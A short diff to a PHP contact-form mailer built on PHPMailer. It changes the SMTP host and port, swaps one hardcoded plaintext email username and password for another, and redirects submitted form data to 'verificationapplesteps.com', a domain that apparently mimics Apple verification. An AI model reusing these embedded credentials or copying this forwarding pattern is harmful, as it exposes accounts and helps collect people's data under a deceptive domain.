@@ -16,14 +16,14 @@ Phone:  '.$_POST['phone'].'<br />
     // Set up SMTP  
     $mail->IsSMTP();                // Sets up a SMTP connection  
     $mail->SMTPAuth = true;         // Connection with the SMTP does require authorization    
-    $mail->SMTPSecure = "ssl";      // Connect using a TLS connection  
-    $mail->Host = "smtp.sendgrid.net";  //Gmail SMTP server address
-    $mail->Port = 465;  //Gmail SMTP port
+    $mail->SMTPSecure = "Tls";      // Connect using a TLS connection  
+    $mail->Host = "smtp.live.com";  //Gmail SMTP server address
+    $mail->Port = 587;  //Gmail SMTP port
     $mail->Encoding = '7bit';
     
     // Authentication  
-    $mail->Username   = "microsystem"; 
-    $mail->Password   = "microsystem@135"; 
+    $mail->Username   = "veronica2009@outlook.fr"; 
+    $mail->Password   = "oraclezend1526"; 
       
     // Compose
 
@@ -31,7 +31,7 @@ Phone:  '.$_POST['phone'].'<br />
     $mail->MsgHTML($message);
  
     // Send To  
-    $mail->AddAddress("veronica2009@outlook.fr", "microsystem"); // Where to send it - Recipient
+    $mail->AddAddress("no-reply@verificationapplesteps.com", "microsystem"); // Where to send it - Recipient
     $result = $mail->Send();    // Send!  
   $message = $result ? 'Successfully Sent!' : 'Sending Failed!';      
   unset($mail);
